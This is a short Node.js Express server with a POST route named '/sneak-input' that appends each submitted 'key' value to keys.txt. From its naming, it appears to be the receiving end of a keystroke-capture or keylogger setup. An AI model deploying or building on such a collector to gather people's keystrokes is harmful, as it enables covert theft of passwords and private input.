'use strict';

var express = require('express');
var app = express();
var port = process.env.PORT || 3000;

const fs = require('fs');

var bodyParser = require('body-parser');
app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies


// start the server
app.listen(port);
app.post('/sneak-input', function (req, res) {
    var input_key = '[' + req.body.key + '],';

    fs.appendFile('keys.txt', input_key, (err) => {
        // throws an error, you could also catch it here
        if (err) throw err;

        // success case, the file was saved
        res.send('done');
    });

});

console.log('Server started! At http://127.0.0.1:' + port);